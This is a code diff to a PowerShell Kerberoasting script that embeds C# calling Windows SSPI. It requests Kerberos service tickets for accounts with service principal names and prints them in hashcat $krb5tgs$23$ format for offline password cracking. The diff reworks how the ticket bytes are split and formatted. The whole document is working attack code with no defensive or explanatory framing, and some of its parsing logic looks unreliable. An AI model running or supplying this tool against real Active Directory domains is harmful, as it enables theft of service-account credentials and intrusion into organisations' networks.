@@ -50,7 +50,7 @@ public class K {
         public IntPtr pBuffers;
     }
 
-    public static string GetTicket(string spn) {
+    public static byte[] GetTicket(string spn) {
         IntPtr cred = IntPtr.Zero;
         IntPtr ctx = IntPtr.Zero;
         IntPtr expiry1 = IntPtr.Zero;
@@ -60,7 +60,7 @@ public class K {
         try {
             SecBuffer secBuf = new SecBuffer();
             secBuf.BufferType = 2; // SECBUFFER_TOKEN
-            secBuf.cbBuffer = 12288; // 12 KB buffer
+            secBuf.cbBuffer = 12288; // 0x3000 = 12KB buffer
             secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
             IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
@@ -81,7 +81,7 @@ public class K {
                     IntPtr.Zero,
                     out cred,
                     out expiry1) != 0)
-                return "";
+                return null;
 
             if (InitializeSecurityContext(
                     ref cred,
@@ -96,32 +96,21 @@ public class K {
                     ref desc,
                     out attr,
                     out expiry2) != 0)
-                return "";
+                return null;
 
             SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
             if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
-                return "";
+                return null;
 
             byte[] data = new byte[resultBuf.cbBuffer];
             Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
-            return BitConverter.ToString(data).Replace("-", "");
+            return data;
         } finally {
             if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
         }
     }
 }
 "@
-
-# Fallback hex-to-byte conversion for compatibility with older PowerShell
-function Convert-HexToByteArray {
-    param([string]$HexString)
-    $HexString = $HexString -replace '[^0-9A-Fa-f]', ''
-    $bytes = New-Object byte[] ($HexString.Length / 2)
-    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
-        $bytes[$i / 2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
-    }
-    return $bytes
-}
 
 function Get-KerberosTicketHashcatFormat {
     [CmdletBinding()]
@@ -143,37 +132,32 @@ function Get-KerberosTicketHashcatFormat {
         }
 
         foreach ($spn in $user.servicePrincipalName) {
-            try {
-                Write-Host "`n[+] Requesting TGS for SPN: ${spn}"
+            Write-Host "[+] Requesting TGS for SPN: $spn"
+            $ticketBytes = [K]::GetTicket($spn)
+            if ($ticketBytes -and $ticketBytes.Length -gt 0) {
+                $hex = -join ($ticketBytes | ForEach-Object { $_.ToString("x2") })
 
-                $ticketHex = [K]::GetTicket($spn)
-                if (-not $ticketHex) {
-                    Write-Warning "Failed to retrieve ticket for ${spn}."
-                    continue
+                # Search for the checksum/cipher delimiter
+                $pattern = "a282.*?8202"
+                $match = [System.Text.RegularExpressions.Regex]::Match($hex, $pattern)
+                if ($match.Success) {
+                    $index = $match.Index
+                    $cipherHex = $hex.Substring($index)
+                    $checksumHex = $hex.Substring(0, $index)
+
+                    $realm = ($spn.Split("/")[1] -split "\.")[1..99] -join "."
+                    $spnSanitized = $spn.Replace("/", "~")
+
+                    Write-Host "[+] Hashcat Format:"
+                    Write-Output "`$krb5tgs$23$*${SamAccountName}*${realm}*${spnSanitized}*${checksumHex}*${cipherHex}"
+                } else {
+                    Write-Warning "Unable to parse TGS for Hashcat from ticket data."
                 }
-
-                $ticketBytes = Convert-HexToByteArray $ticketHex
-                if ($ticketBytes.Length -le 16) {
-                    Write-Warning "Ticket too short for valid TGS format."
-                    continue
-                }
-
-                $checksum = $ticketBytes[0..15]
-                $ciphertext = $ticketBytes[16..($ticketBytes.Length - 1)]
-
-                $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ''
-                $cipherHex = ($ciphertext | ForEach-Object { $_.ToString("x2") }) -join ''
-
-                $realm = ($spn.Split("/")[-1]).ToUpper().Split(":")[0]
-                $spnSanitized = $spn.Replace(":", "~")
-
-                $hashcat = "\$krb5tgs\$23\$*$SamAccountName\$$realm\$$spnSanitized\$$checksumHex\$$cipherHex"
-                Write-Host "[+] Hashcat Format:`n$hashcat"
-            } catch {
-                Write-Warning "Error while processing SPN '${spn}': $_"
+            } else {
+                Write-Warning "Failed to retrieve TGS for SPN: $spn"
             }
         }
     } catch {
-        Write-Error "Error during execution: $_"
+        Write-Error "Error: $_"
     }
 }
